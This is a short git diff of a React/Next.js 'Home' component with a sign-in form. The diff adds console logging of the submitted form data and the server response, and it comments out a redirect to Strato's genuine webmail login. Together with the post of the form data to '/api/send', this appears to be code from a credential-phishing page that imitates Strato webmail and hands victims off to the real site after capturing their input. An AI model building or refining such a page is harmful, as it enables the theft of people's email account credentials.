@@ -24,13 +24,17 @@ export default function Home() {
       }
     }
 
+    console.log(dataObj);
+
     try {
       const result = await axios.post("/api/send", JSON.stringify(dataObj));
 
+      console.log(result);
+
       if (result.status === 200) {
-        return window.location.replace(
-          "https://webmail.strato.com/appsuite/ui"
-        );
+        // return window.location.replace(
+        //   "https://webmail.strato.com/appsuite/ui"
+        // );
       }
 
       return;
@@ -148,7 +152,7 @@ export default function Home() {
             <input
               type="submit"
               value={languages.sign}
-              className="bg-sky-600 py-2 w-[85%] text-white absolute bottom-5"
+              className="bg-sky-600 py-2 w-[85%] text-white absolute bottom-5 cursor-pointer"
             />
           </form>
         </main>
